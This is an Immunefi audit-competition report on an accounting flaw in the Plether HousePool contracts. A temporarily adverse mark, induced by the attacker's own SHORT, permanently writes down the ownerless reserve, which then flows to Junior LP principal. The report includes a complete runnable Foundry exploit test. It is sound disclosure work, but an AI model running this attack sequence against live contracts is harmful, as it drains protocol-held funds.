# \#100040 [SC-Medium] Temporary adverse mark turns ownerless reserve into Junior principal

**Submitted on Nov 16th 2026 at 06:18:00 UTC by @Abhan for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100040
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief / Intro

Value that belongs to no tranche, such as an owner recapitalization made while Senior is healthy, is held in `unassignedAssets`, and the only intended way to hand it to LPs is the owner's `assignUnassignedAssets`, which assigns it to a tranche and mints matching shares. A fresh reconcile, however, caps that reserve at the pool's current marked equity and stores the reduced figure for good, so if an LP epoch settles while the mark is temporarily adverse, the reserve is written down, and when the mark comes back the written-down amount flows through the Senior/Junior waterfall as ordinary LP principal, with no owner assignment and no share mint. A Junior LP who also holds a position that moves the mark can arrange exactly this and redeem the result. In the PoC, which uses release parameters, the production router, pool and vaults and only Pyth and USDG mocks, an attacker with 1,000 USDG of Junior and an 80,000-token SHORT settles one epoch at a 1.05 mark, lets the mark return to 1.00, and redeems **2,837.96 USDG more** than in a matched control, while the ownerless reserve falls by 2,840.80 USDG, with pool cash and the trader's balance identical in both branches.

## Vulnerability Details

The accounting specification (ACCOUNTING_SPEC.md L315) requires that "value with no valid claimant path must sit in explicit `unassignedAssets`". An owner recapitalization made while Senior is not impaired has no claimant, so `applyClaimantRecapitalizationIntent` puts all of it into `unassignedAssets`. Moving it to LPs is an explicit owner decision: `HousePool.assignUnassignedAssets` (L660-L704) reconciles, assigns the whole balance to a chosen tranche, and mints matching bootstrap shares to a chosen receiver.

During every fresh reconcile, `HousePoolReconcilePlanLib.planReconcile` caps the stored reserve at the current marked distributable equity before routing the rest through the waterfall:

```solidity
// HousePoolReconcilePlanLib.sol L73-L74 (planReconcile)
plan.state.unassignedAssets =
    state.unassignedAssets > snapshot.distributable ? snapshot.distributable : state.unassignedAssets;
```

`HousePool._reconcile` persists the capped value:

```solidity
// HousePool.sol L1584-L1585 (_reconcile)
_setWaterfallState(plan.state.waterfall);
unassignedAssets = plan.state.unassignedAssets;
```

Nothing records how much ownerless value the cap removed. Distributable equity depends on the mark, so an adverse but temporary mark lowers the cap, and the reserve is written down to the marked figure. When the mark returns, distributable equity rises again, but the planner subtracts only the reduced reserve and routes everything above it to LP principal:

```solidity
// HousePoolReconcilePlanLib.sol L84-L100 (planReconcile)
uint256 distributableToClaims = snapshot.distributable > plan.state.unassignedAssets
    ? snapshot.distributable - plan.state.unassignedAssets
    : 0;
HousePoolWaterfallAccountingLib.ReconcilePlan memory waterfallPlan =
    HousePoolWaterfallAccountingLib.planReconcile(
        plan.state.waterfall.seniorPrincipal, plan.state.waterfall.juniorPrincipal, distributableToClaims
    );
...
if (plan.revenue) {
    plan.juniorPrincipalBeforeRevenue = plan.state.waterfall.juniorPrincipal;
    plan.state.waterfall =
        HousePoolWaterfallAccountingLib.distributeRevenue(plan.state.waterfall, plan.deltaAssets);
    return plan;
}
```

The recovered value is therefore credited as revenue: Senior up to its high-water mark first, the rest to Junior principal, which existing Junior shares can redeem. No `assignUnassignedAssets` call and no share mint happens, so ownerless value becomes LP value without the owner's decision.

The concrete attack runs as follows. Both tranches hold their documented 1 USDG seeds. The attacker deposits 1,000 USDG of Junior. The owner recapitalizes the pool with 200,000 USDG, and the next LP settlement, here the attacker's own ordinary 2 USDG partial redemption, reconciles it into `unassignedAssets` = 200,000 USDG. The attacker's separate trading account, funded with 20,000 USDG, opens an 80,000-token SHORT at 1.00 through the public router. The attacker then requests a redemption of all its Junior shares, and the epoch settles while the basket is at 1.05. The SHORT's unrealized gain lowers marked equity, so the reserve is capped down to 197,159.20 USDG and Junior's marked value is zero, which makes the redemption refundable rather than funded; the point of the request is only that this settlement persists the write-down. The basket returns to 1.00, the same SHORT closes, and the attacker reclaims its refunded shares. One cooldown later it redeems all of them at a mark of 1.00, and the 2,840.80 USDG removed from the reserve is now in Junior principal.

## Impact Details

Ownerless value that the protocol holds for an explicit owner decision is moved into LP principal and paid out to an LP who did nothing more than time an epoch settlement against a mark that its own position moved. In the PoC the reserve ends at 197,159.20 USDG instead of 200,000.00 USDG, Junior principal before the final redemption is 3,872.06 USDG instead of 1,031.26 USDG, and the attacker's final redemption pays 3,868.19 USDG instead of 1,030.23 USDG, an extra 2,837.96 USDG. Pool cash (201,032.27 USDG) and the trader account's balance (19,935.53 USDG) are identical in both branches before the final redemption, so the extra payout comes entirely out of the ownerless reserve. The attacker needs no privilege; the owner action involved is the ordinary, documented `recapitalizePool`, and every other step uses public router and vault entry points. The amount scales with the size of the reserve and of the temporary mark move that the attacker's own position creates.

## Recommendation

Do not let a mark-dependent cap permanently change the ownerless reserve: keep the stored `unassignedAssets` unchanged and apply the cap only to the amount used in the current reconcile, or record the written-down part separately and restore it to `unassignedAssets` before any recovered equity is routed to LP principal, so that ownerless value can only reach a tranche through `assignUnassignedAssets`.

## References

The reserve is capped at current marked equity: [HousePoolReconcilePlanLib.sol#L73-L100](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol?plain=1#L73-L100)

The capped value is persisted: [HousePool.sol#L1584-L1585](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol?plain=1#L1584-L1585)

The intended owner-only route for ownerless value: [HousePool.sol#L660-L704](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol?plain=1#L660-L704)

The specification requires ownerless value to stay in `unassignedAssets`: [ACCOUNTING_SPEC.md#L315](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L315)

## Proof of Concept

## Proof of Concept

The vulnerability is demonstrated by a runnable Foundry test against the audit repository, `immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The complete test code is included at the end of this section.

The test extends the repository's own `BasePerpTest` harness (`packages/perps/test/perps/BasePerpTest.sol`) and does not modify any contract under `src/`. The only mocks are the repository's Pyth and USDG test contracts. Every trade goes through the production V3 entry point `IPerpsTraderActions.commitOrder(OrderRequest)` and is executed by an arbitrary keeper through `router.executeOrder`. Every LP deposit, redemption, refund and claim uses the public vault functions, and every epoch is settled through the permissionless `router.settleLpEpoch`. The only owner action is the documented `CfdEngine.recapitalizePool`. No protocol contract is impersonated and `pool.reconcile` is never called directly. The test applies the release parameters from `DEPLOYMENT.md`, including the 1 USDG tranche seeds.

### Step-by-step (`test_AdverseMarkSettlementTurnsOwnerlessReserveIntoJuniorPrincipal`)

**Setup.** On Monday the attacker deposits 1,000 USDG of Junior through the public flow. The owner calls `recapitalizePool(200,000 USDG)`, and the attacker's 2 USDG partial redemption settles in the next epoch, which records the whole recap as `unassignedAssets` = 200,000 USDG. The attacker's trading account deposits 20,000 USDG and, on Tuesday, opens an 80,000-token SHORT at 1.00.

**Adverse-mark settlement (attack branch only).** The attacker requests a redemption of all its Junior shares, and a keeper settles the epoch with the basket at 1.05. Nothing is funded because Junior's marked value is zero, the request is marked refundable, and `unassignedAssets` is now 197,159.203981 USDG. In the control branch nobody requests anything and the mark simply moves to 1.05.

**Recovery.** The mark returns to 1.00 and the same SHORT closes in both branches. In the attack branch the attacker reclaims its refunded shares.

**Final redemption.** One cooldown later, in both branches and on the same clock, the attacker redeems all its Junior shares at a mark of 1.00. Pool cash is 201,032.265082 USDG and the trader account holds 19,935.534919 USDG in both branches. Junior principal is 1,031.263293 USDG in the control and 3,872.059330 USDG in the attack, and the redemption pays 1,030.232588 USDG in the control and 3,868.189366 USDG in the attack: **2,837.956778 USDG more**. `unassignedAssets` is 200,000.000000 USDG in the control and 197,159.203981 USDG in the attack.

### How to run

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
# save the test code below as packages/perps/test/poc/OwnerlessReserveMarkWriteDown.t.sol
cd packages/perps
FOUNDRY_TEST=test/poc FOUNDRY_SCRIPT=test/poc forge test --match-path test/poc/OwnerlessReserveMarkWriteDown.t.sol -vv
```

The two `FOUNDRY_*` variables limit compilation to the PoC. The package builds with via-IR, so compiling its whole test suite takes much longer; running without them also works. Expected result: `Suite result: ok. 1 passed; 0 failed; 0 skipped`, with the values above in the logs.

### PoC code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @title A temporary adverse mark turns ownerless reserve into redeemable Junior principal
/// @notice An owner recapitalization with Senior unimpaired is recorded as `unassignedAssets`, value that belongs to no
///         tranche until the owner assigns it. A fresh reconcile caps that reserve at current marked equity and stores
///         the reduced amount. If an LP epoch settles while the mark is temporarily adverse, the reserve is written
///         down; when the mark returns, the written-down amount is routed through the Senior/Junior waterfall as LP
///         principal, without any owner assignment or share mint, and a Junior LP can redeem it.
/// @dev Release parameters from packages/perps/DEPLOYMENT.md. Production V3 `commitOrder` and permissionless
///      `executeOrder` / `updateMarkPrice` / `settleLpEpoch`; LP actions use the public vault functions. The only owner
///      action is the documented `CfdEngine.recapitalizePool`. Pyth and USDG are the only mocks. No contract under
///      src/ is modified or impersonated.
contract OwnerlessReserveMarkWriteDownTest is BasePerpTest {

    address internal constant ATTACKER_LP = address(0xA11CE); // ordinary Junior LP
    address internal constant ATTACKER_TRADER = address(0xA77AC); // the same person's trading account
    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant ONE = 1e8;
    uint256 internal constant ADVERSE = 1.05e8;
    uint256 internal constant SHORT_SIZE = 80_000e18; // SHORT profits when the basket rises
    uint256 internal constant RECAP = 200_000e6;

    uint256 internal epochStart;

    // ------------------------------------------------------------------------------------------------------------
    // Release configuration
    // ------------------------------------------------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);

        // The admin timelocks above end inside a weekend closure; resume on the next Monday 10:00 UTC. Both tranches
        // hold only their 1 USDG seeds.
        vm.warp(SETUP_TIMESTAMP + 7 days);
        vm.roll(vm.getBlockNumber() + 10);
        assertFalse(engine.isOracleFrozen(), "regular trading hours");
        _markNow(ONE);

        // The attacker deposits 1,000 USDG of Junior. The owner then recapitalizes the pool (documented owner action).
        // The next LP settlement (here, the attacker's ordinary 2 USDG partial redemption) reconciles the recap while
        // Senior is unimpaired, so the whole amount is recorded as ownerless `unassignedAssets`.
        _publicJuniorDeposit(ATTACKER_LP, 1000e6);
        _goto(vm.getBlockTimestamp() + 1 hours + 1); // deposit cooldown
        _markNow(ONE);
        settlementToken.mint(engine.owner(), RECAP);
        vm.startPrank(engine.owner());
        settlementToken.approve(address(engine), RECAP);
        engine.recapitalizePool(RECAP);
        vm.stopPrank();
        uint256 partialShares = juniorVault.convertToShares(2e6);
        vm.prank(ATTACKER_LP);
        uint256 partialId = juniorVault.requestRedeem(partialShares, ATTACKER_LP, ATTACKER_LP);
        _goto(juniorVault.depositEpochStart(partialId));
        _settleNow(ONE);
        vm.prank(ATTACKER_LP);
        juniorVault.claimRedeem(partialId, partialShares, ATTACKER_LP, ATTACKER_LP);
        assertEq(pool.unassignedAssets(), RECAP, "the recap is ownerless reserve");
        _fundTrader(ATTACKER_TRADER, 20_000e6);

        // Tuesday 10:00 UTC.
        _goto(SETUP_TIMESTAMP + 8 days);
        _markNow(ONE);

        // The attacker's trading account opens an 80,000-token SHORT at 1.00 through the public Router.
        epochStart = (vm.getBlockTimestamp() / 3600 + 1) * 3600;
        _goto(epochStart + 30);
        _markNow(ONE);
        _trade(CfdTypes.Side.SHORT, SHORT_SIZE, 10_000e6, false, ONE);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Helpers (public entry points only)
    // ------------------------------------------------------------------------------------------------------------

    function _goto(
        uint256 timestamp
    ) internal {
        require(timestamp >= vm.getBlockTimestamp(), "time moves forward");
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _payload(
        uint256 price,
        uint256 publishTime
    ) internal pure returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i],
                MockPyth.MockPrice(SafeCast.toInt64(SafeCast.toInt256(price)), 0, -8, publishTime, publishTime - 1)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _markNow(
        uint256 price
    ) internal {
        bytes[] memory data = _payload(price, vm.getBlockTimestamp());
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    function _settleNow(
        uint256 price
    ) internal {
        bytes[] memory data = _payload(price, vm.getBlockTimestamp());
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
    }

    function _publicJuniorDeposit(
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _goto(juniorVault.depositEpochStart(requestId));
        _settleNow(ONE);
        assertEq(juniorVault.claimableDepositRequest(requestId, lp), amount, "deposit activated in full");
        vm.prank(lp);
        juniorVault.claimDeposit(requestId, amount, lp, lp);
    }

    function _trade(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        uint256 window = router.maxExecutionWindowSeconds();
        uint256 c = vm.getBlockTimestamp();
        uint256 target = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(ATTACKER_TRADER, router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: target,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(c + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(ATTACKER_TRADER);
        uint64 id = IPerpsTraderActions(address(router)).commitOrder(request);
        _goto(c + 1);
        bytes[] memory data = _payload(price, c + 1);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "trade executed");
        _goto(vm.getBlockTimestamp() + 1);
    }

    function _usd(
        string memory label,
        uint256 v
    ) internal pure {
        string memory frac = vm.toString(v % 1e6);
        while (bytes(frac).length < 6) {
            frac = string.concat("0", frac);
        }
        console2.log(string.concat(label, ": ", vm.toString(v / 1e6), ".", frac));
    }

    struct Outcome {
        uint256 unassignedAfterAdverseSettle;
        uint256 unassignedBeforeFinalRedemption;
        uint256 poolCashBeforeFinalRedemption;
        uint256 traderAssetsBeforeFinalRedemption;
        uint256 juniorPrincipalBeforeFinalRedemption;
        uint256 redemptionUsdg;
    }

    /// @dev `attack`: the LP queues a Junior redemption so that an epoch settles at the adverse mark.
    function _run(
        bool attack
    ) internal returns (Outcome memory o) {
        uint256 shares = juniorVault.balanceOf(ATTACKER_LP);
        uint256 interimId;
        if (attack) {
            vm.prank(ATTACKER_LP);
            interimId = juniorVault.requestRedeem(shares, ATTACKER_LP, ATTACKER_LP);
            assertEq(juniorVault.depositEpochStart(interimId), epochStart + 3600, "matures at the next boundary");
        }

        // The basket rises to 1.05 for the epoch boundary.
        _goto(epochStart + 3600);
        if (attack) {
            _settleNow(ADVERSE);
            assertEq(juniorVault.claimableRedeemRequest(interimId, ATTACKER_LP), 0, "nothing funded: Junior NAV is 0");
            assertTrue(juniorVault.redeemRefundPending(interimId, ATTACKER_LP), "the request is refunded");
            o.unassignedAfterAdverseSettle = pool.unassignedAssets();
        } else {
            _markNow(ADVERSE);
        }

        // The mark returns to 1.00 and the same SHORT closes.
        _goto(vm.getBlockTimestamp() + 1);
        _markNow(ONE);
        _trade(CfdTypes.Side.SHORT, SHORT_SIZE, 0, true, ONE);
        if (attack) {
            vm.prank(ATTACKER_LP);
            juniorVault.claimRedeemRefund(interimId, ATTACKER_LP, ATTACKER_LP);
        }

        // One cooldown later the LP redeems all its Junior shares in both branches, on the same clock.
        _goto(epochStart + 3600 + 1 hours + 120);
        _markNow(ONE);
        o.traderAssetsBeforeFinalRedemption = clearinghouse.balanceAssets(ATTACKER_TRADER);
        o.poolCashBeforeFinalRedemption = settlementToken.balanceOf(address(pool));
        uint256 finalShares = juniorVault.balanceOf(ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        uint256 finalId = juniorVault.requestRedeem(finalShares, ATTACKER_LP, ATTACKER_LP);
        _goto(juniorVault.depositEpochStart(finalId));
        (, o.juniorPrincipalBeforeFinalRedemption,,) = pool.getPendingTrancheState();
        _settleNow(ONE);
        o.unassignedBeforeFinalRedemption = pool.unassignedAssets();
        uint256 claimable = juniorVault.claimableRedeemRequest(finalId, ATTACKER_LP);
        uint256 before = settlementToken.balanceOf(ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        juniorVault.claimRedeem(finalId, claimable, ATTACKER_LP, ATTACKER_LP);
        o.redemptionUsdg = settlementToken.balanceOf(ATTACKER_LP) - before;
    }

    // ------------------------------------------------------------------------------------------------------------
    // Test
    // ------------------------------------------------------------------------------------------------------------

    function test_AdverseMarkSettlementTurnsOwnerlessReserveIntoJuniorPrincipal() public {
        uint256 snap = vm.snapshotState();
        Outcome memory c = _run(false);
        vm.revertToState(snap);
        Outcome memory a = _run(true);

        _usd("unassignedAssets right after the 1.05 settlement (attack)", a.unassignedAfterAdverseSettle);
        _usd("unassignedAssets after the final settlement, control", c.unassignedBeforeFinalRedemption);
        _usd("unassignedAssets after the final settlement, attack ", a.unassignedBeforeFinalRedemption);
        _usd("pool cash before the final redemption, control", c.poolCashBeforeFinalRedemption);
        _usd("pool cash before the final redemption, attack ", a.poolCashBeforeFinalRedemption);
        _usd("trader assets before the final redemption, control", c.traderAssetsBeforeFinalRedemption);
        _usd("trader assets before the final redemption, attack ", a.traderAssetsBeforeFinalRedemption);
        _usd("Junior principal before the final redemption, control", c.juniorPrincipalBeforeFinalRedemption);
        _usd("Junior principal before the final redemption, attack ", a.juniorPrincipalBeforeFinalRedemption);
        _usd("LP redemption payout, control", c.redemptionUsdg);
        _usd("LP redemption payout, attack ", a.redemptionUsdg);
        _usd("EXTRA USDG REDEEMED BY THE LP", a.redemptionUsdg - c.redemptionUsdg);
        _usd("ownerless reserve lost", c.unassignedBeforeFinalRedemption - a.unassignedBeforeFinalRedemption);

        assertEq(a.poolCashBeforeFinalRedemption, c.poolCashBeforeFinalRedemption, "same pool cash in both branches");
        assertEq(a.traderAssetsBeforeFinalRedemption, c.traderAssetsBeforeFinalRedemption, "same trader result in both");
        assertEq(c.unassignedBeforeFinalRedemption, RECAP, "control: the whole recap stays ownerless");
        assertLt(a.unassignedBeforeFinalRedemption, RECAP, "attack: the ownerless reserve was written down");
        assertGt(a.redemptionUsdg, c.redemptionUsdg + 1000e6, "the LP redeems the written-down reserve");
    }

}
```

